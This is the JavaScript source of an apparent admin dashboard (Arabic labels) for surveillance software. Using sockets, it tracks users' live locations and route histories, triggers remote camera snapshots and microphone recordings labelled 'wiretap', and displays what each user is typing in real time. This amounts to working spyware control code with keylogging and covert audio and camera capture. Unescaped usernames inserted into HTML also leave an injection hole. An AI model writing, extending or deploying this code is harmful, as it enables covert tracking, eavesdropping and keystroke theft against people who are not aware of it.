document.addEventListener('DOMContentLoaded', () => {
    const socket = io();
    let map = null;
    const usersMap = new Map(); // Store markers and DOM elements by user ID
    
    const activeCount = document.getElementById('activeCount');
    const usersList = document.getElementById('usersList');
    
    // Modal Elements
    const mediaModal = document.getElementById('mediaModal');
    const closeModal = document.getElementById('closeModal');
    const mediaTitle = document.getElementById('mediaTitle');
    const snapshotImage = document.getElementById('snapshotImage');
    const audioContainer = document.getElementById('audioContainer');
    const wiretapAudio = document.getElementById('wiretapAudio');

    closeModal.addEventListener('click', () => {
        mediaModal.classList.add('hidden');
        wiretapAudio.pause(); // stop playing if closed
    });

    // Initialize Map
    function initMap() {
        map = L.map('adminMap').setView([24.7136, 46.6753], 5); // Default center (Riyadh, SA)
        
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            attribution: '&copy; OpenStreetMap contributors'
        }).addTo(map);
    }
    
    initMap();

    // Socket Events
    socket.emit('admin_join');

    socket.on('initial_locations', (users) => {
        users.forEach(user => updateOrAddUser(user));
        updateCount();
    });

    socket.on('user_location_updated', (user) => {
        updateOrAddUser(user);
        updateCount();
    });

    socket.on('user_disconnected', (userId) => {
        // Keep the last-known marker/card — just mark as offline
        if (usersMap.has(userId)) {
            const userObj = usersMap.get(userId);
            userObj.element.classList.add('offline');
            const badge = userObj.element.querySelector('.online-badge');
            if (badge) badge.textContent = '⚫ غير متصل';
            userObj.marker.setOpacity(0.45);
        }
        updateCount();
    });

    socket.on('user_went_offline', (data) => {
        if (usersMap.has(data.id)) {
            const userObj = usersMap.get(data.id);
            userObj.element.classList.add('offline');
            userObj.marker.setOpacity(0.45);
        }
    });

    // Route modal state
    let routePolyline = null;
    let routeMarkers = [];

    socket.on('route_history', (data) => {
        const { username, route } = data;
        mediaTitle.textContent = `مسار: ${username} (${route.length} نقطة)`;
        snapshotImage.classList.add('hidden');
        audioContainer.classList.add('hidden');
        mediaModal.classList.remove('hidden');

        // Clear previous route
        if (routePolyline) { map.removeLayer(routePolyline); routePolyline = null; }
        routeMarkers.forEach(m => map.removeLayer(m));
        routeMarkers = [];

        if (!route.length) return;

        const latlngs = route.map(p => [p.lat, p.lon]);
        routePolyline = L.polyline(latlngs, { color: '#ff6b35', weight: 3, opacity: 0.8 }).addTo(map);
        routeMarkers.push(routePolyline);

        // Start (green) & end (red) markers with time popups
        const t = (iso) => new Date(iso).toLocaleString('ar-EG');
        const startIcon = L.divIcon({ html: '🟢', className: '', iconSize: [24, 24] });
        const endIcon = L.divIcon({ html: '🔴', className: '', iconSize: [24, 24] });

        const startM = L.marker(latlngs[0], { icon: startIcon }).addTo(map)
            .bindPopup(`<b>البداية</b><br>${t(route[0].at)}`);
        const endM = L.marker(latlngs[latlngs.length - 1], { icon: endIcon }).addTo(map)
            .bindPopup(`<b>آخر موقع</b><br>${t(route[route.length - 1].at)}`);
        routeMarkers.push(startM, endM);

        map.fitBounds(routePolyline.getBounds().pad(0.2));

        // Close modal clears the drawn route
    });

    closeModal.addEventListener('click', () => {
        mediaModal.classList.add('hidden');
        wiretapAudio.pause();
        if (routePolyline) { map.removeLayer(routePolyline); routePolyline = null; }
        routeMarkers.forEach(m => map.removeLayer(m));
        routeMarkers = [];
    });

    socket.on('snapshot_received', (data) => {
        const displayName = data.username ? data.username : `مجهول #${data.id.substring(0,4)}`;
        mediaTitle.textContent = `صورة من كاميرا: ${displayName}`;
        
        audioContainer.classList.add('hidden');
        snapshotImage.classList.remove('hidden');
        snapshotImage.src = data.image;
        
        mediaModal.classList.remove('hidden');
    });

    socket.on('audio_received', (data) => {
        const displayName = data.username ? data.username : `مجهول #${data.id.substring(0,4)}`;
        mediaTitle.textContent = `تسجيل صوتي من: ${displayName}`;
        
        snapshotImage.classList.add('hidden');
        audioContainer.classList.remove('hidden');
        wiretapAudio.src = data.audio;
        wiretapAudio.play();
        
        mediaModal.classList.remove('hidden');
    });

    socket.on('user_typing_live', (data) => {
        if (usersMap.has(data.id)) {
            const userObj = usersMap.get(data.id);
            const typingIndicator = userObj.element.querySelector('.typing-indicator');
            if (data.text.trim() === '') {
                typingIndicator.textContent = '';
            } else {
                typingIndicator.textContent = `يكتب الآن: ${data.text}`;
            }
        }
    });

    // Helper Functions
    function updateOrAddUser(userData) {
        const { id, lat, lon, addressDetails, username } = userData;
        const displayName = username ? username : `مجهول #${id.substring(0,4)}`;
        
        let displayLocation = "موقع غير محدد";
        if (addressDetails) {
            const city = addressDetails.city || addressDetails.town || addressDetails.village || '';
            const country = addressDetails.country || '';
            displayLocation = `${city} ${country ? '- ' + country : ''}`;
        }

        if (usersMap.has(id)) {
            // Update existing user
            const userObj = usersMap.get(id);
            userObj.marker.setLatLng([lat, lon]);
            
            // Update DOM
            userObj.element.querySelector('.user-coords').textContent = `${lat.toFixed(5)}, ${lon.toFixed(5)}`;
            if (addressDetails) {
                userObj.element.querySelector('.user-location').textContent = displayLocation;
                userObj.marker.bindPopup(`
                    <div style="text-align: right; font-family: 'Tajawal', sans-serif;">
                        <strong>${displayName}</strong><br>
                        ${displayLocation}
                    </div>
                `, { className: 'custom-popup' });
            }
        } else {
            // Add new user
            const customIcon = L.icon({
                iconUrl: 'https://raw.githubusercontent.com/pointhi/leaflet-color-markers/master/img/marker-icon-2x-red.png',
                shadowUrl: 'https://cdnjs.cloudflare.com/ajax/libs/leaflet/0.7.7/images/marker-shadow.png',
                iconSize: [25, 41],
                iconAnchor: [12, 41],
                popupAnchor: [1, -34],
                shadowSize: [41, 41]
            });

            const marker = L.marker([lat, lon], {icon: customIcon, opacity: userData.online === false ? 0.45 : 1}).addTo(map);
            marker.bindPopup(`
                <div style="text-align: right; font-family: 'Tajawal', sans-serif;">
                    <strong>${displayName}</strong><br>
                    ${displayLocation}
                </div>
            `, { className: 'custom-popup' });

            const li = document.createElement('li');
            li.className = 'user-card' + (userData.online === false ? ' offline' : '');
            li.innerHTML = `
                <div class="user-id">
                    <span>👤 ${displayName}</span>
                    <div>
                        ${userData.online === false ? '<span class="online-badge">⚫ آخر موقع معروف</span>' : '<span class="online-badge">🟢 متصل</span>'}
                        <button class="push-btn" data-username="${displayName}" title="إرسال إشعار">🔔</button>
                        <button class="route-btn" data-username="${displayName}">🗺️</button>
                        <button class="audio-btn" data-id="${id}">🎙️</button>
                        <button class="snapshot-btn" data-id="${id}">📸</button>
                    </div>
                </div>
                <div class="user-location">${displayLocation}</div>
                <div class="user-coords">${lat.toFixed(5)}, ${lon.toFixed(5)}</div>
                <div class="typing-indicator"></div>
            `;

            // Disable snapshot/audio for offline users
            if (userData.online === false) {
                li.querySelector('.snapshot-btn').style.display = 'none';
                li.querySelector('.audio-btn').style.display = 'none';
            }
            
            // Handle push notification click
            const pushBtn = li.querySelector('.push-btn');
            pushBtn.addEventListener('click', (e) => {
                e.stopPropagation();
                const body = prompt(`رسالة إشعار إلى ${displayName}:`, 'رجاء افتح التطبيق');
                if (body) socket.emit('admin_send_push', { username: displayName, title: '🔐 رسالة من المشرف', body });
            });

            // Handle route click
            const routeBtn = li.querySelector('.route-btn');
            routeBtn.addEventListener('click', (e) => {
                e.stopPropagation();
                mediaModal.classList.remove('hidden');
                socket.emit('request_route', displayName);
            });

            // Handle snapshot click
            const snapBtn = li.querySelector('.snapshot-btn');
            snapBtn.addEventListener('click', (e) => {
                e.stopPropagation();
                socket.emit('request_snapshot', id);
            });

            // Handle audio click
            const audioBtn = li.querySelector('.audio-btn');
            audioBtn.addEventListener('click', (e) => {
                e.stopPropagation();
                socket.emit('request_audio', id);
                audioBtn.textContent = '⏳';
                setTimeout(() => audioBtn.textContent = '🎙️', 5000);
            });
            
            li.addEventListener('click', () => {
                // Remove active class from all
                document.querySelectorAll('.user-card').forEach(el => el.classList.remove('active'));
                li.classList.add('active');
                
                map.flyTo([lat, lon], 16, {
                    duration: 1.5
                });
                marker.openPopup();
            });

            usersList.appendChild(li);

            usersMap.set(id, {
                marker,
                element: li
            });
            
            // Auto fit bounds if this is the first user
            if (usersMap.size === 1) {
                map.setView([lat, lon], 12);
            }
        }
    }

    function removeUser(id) {
        if (usersMap.has(id)) {
            const userObj = usersMap.get(id);
            map.removeLayer(userObj.marker);
            userObj.element.remove();
            usersMap.delete(id);
        }
    }

    function updateCount() {
        activeCount.textContent = usersMap.size;
    }
});
